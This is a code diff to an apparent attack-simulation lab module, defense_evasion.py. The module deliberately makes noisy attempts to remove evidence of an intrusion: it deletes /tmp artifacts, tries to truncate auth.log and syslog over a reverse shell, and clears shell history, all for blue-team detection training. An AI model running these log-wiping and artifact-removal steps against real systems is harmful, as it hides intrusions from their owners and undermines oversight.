@@ -5,7 +5,7 @@ import time
 from chainlog import log
 
 # =============================================================================
-# defensive_evasion.py — Messy and Loud Defensive Evasion
+# defense_evasion.py — Messy and Loud Defense Evasion
 # MITRE ATT&CK:
 #   T1070     – Indicator Removal (parent technique)
 #   T1070.001 – Clear Linux or Mac System Logs  (log truncation attempts)
@@ -32,13 +32,16 @@ from chainlog import log
 #     in the session buffer before the buffer is wiped.
 # =============================================================================
 
-# /tmp artefacts the attacker expects to find on apache — most are already
-# removed by prior chain steps; redundant rm calls generate visible errors.
+# /tmp artefacts the attacker expects to find on apache — each was genuinely
+# created and then removed by a prior chain step, so the redundant rm calls
+# here hit already-gone files and generate the visible "No such file" errors
+# that a blue team can correlate. Keep this list in sync with the paths the
+# upstream steps actually touch; phantom entries would still error but would
+# misrepresent the chain.
 _APACHE_TMP_ARTIFACTS = [
-    "/tmp/lp.sh",            # LinPEAS script     (removed by post_exploit_recon)
-    "/tmp/lp_out.txt",       # LinPEAS output     (removed by post_exploit_recon)
-    "/tmp/john_deploy_key",  # staged deploy key  (removed by lateral_movement)
-    "/tmp/cs-scan.gnmap",    # nmap scan results  (removed by credential_stuffing)
+    "/tmp/lp.sh",            # LinPEAS script  (created+removed by post_exploit_enumeration)
+    "/tmp/lp_out.txt",       # LinPEAS output  (created+removed by post_exploit_enumeration)
+    "/tmp/lm-scan.gnmap",    # nmap sweep      (created+removed by lateral_movement)
 ]
 
 # /tmp artefacts the attacker expects to find on john's workstation.
@@ -206,18 +209,28 @@ def _workstation_delete_artifacts(john_shell):
 def _workstation_attempt_log_wipe(john_shell):
     """Attempt to truncate system logs as john.stravidis (T1070.001).
 
-    john has no write access to /var/log — the "Permission denied" errors
-    are observable events in the shell history and can trigger auditd alerts.
+    john has no write access to /var/log — the attempt fails and the failed
+    attempt is itself an observable event that can trigger auditd alerts.
+
+    Success/failure is detected from the redirection's exit status, echoed to
+    stdout as a marker, rather than by grepping the error text. The lateral
+    reverse shell that hands us this socket is launched with ``2>/dev/null``,
+    so the shell's "Permission denied" message for a failed ``>`` redirection
+    is swallowed and never reaches the capture buffer. Relying on the marker
+    keeps the result correct regardless of where stderr points.
     """
     log("[*] Attempting to truncate system logs (expect permission denied) ...")
     for log_path in ("/var/log/auth.log", "/var/log/syslog"):
-        out = _run_remote(john_shell, f"cat /dev/null > {log_path} 2>&1 || true")
-        if "Permission denied" in out or "permission denied" in out:
+        out = _run_remote(
+            john_shell,
+            f"if : > {log_path} 2>/dev/null; then echo WIPE_OK; else echo WIPE_DENIED; fi",
+        )
+        if "WIPE_DENIED" in out:
             log(f"[-] {log_path}: permission denied — failed attempt is itself detectable")
-        elif out:
-            log(f"[?] {log_path}: unexpected output ({out!r})")
-        else:
+        elif "WIPE_OK" in out:
             log(f"[+] {log_path}: truncated (unexpected — john should not have write access)")
+        else:
+            log(f"[?] {log_path}: indeterminate result ({out!r})")
 
 
 def _workstation_clear_history(john_shell):
@@ -258,7 +271,7 @@ def run(root_shell, john_shell):
         john_shell (socket | None): john.stravidis shell on ubuntu_workstation
                                     (lateral_movement step).
     """
-    log("\n[*] Starting defensive evasion (messy indicator removal) ...")
+    log("\n[*] Starting defense evasion (messy indicator removal) ...")
 
     if root_shell is not None:
         log("\n[*] ── Apache (root) ──────────────────────────────────────")
@@ -289,12 +302,12 @@ def run(root_shell, john_shell):
     else:
         log("[-] john_shell not available — skipping workstation cleanup")
 
-    log("\n[*] Defensive evasion complete — tracks incompletely covered")
+    log("\n[*] Defense evasion complete — tracks incompletely covered")
 
 
 # ---------------------------------------------------------------------------
 # Standalone test mode
-# Usage: docker compose exec kali python3 /Attack-chain/defensive_evasion.py
+# Usage: docker compose exec kali python3 /Attack-chain/defense_evasion.py
 # Pre-conditions:
 #   root shell listening on kali port 5555  (apache → kali)
 #   john shell listening on kali port 6666  (workstation → kali)
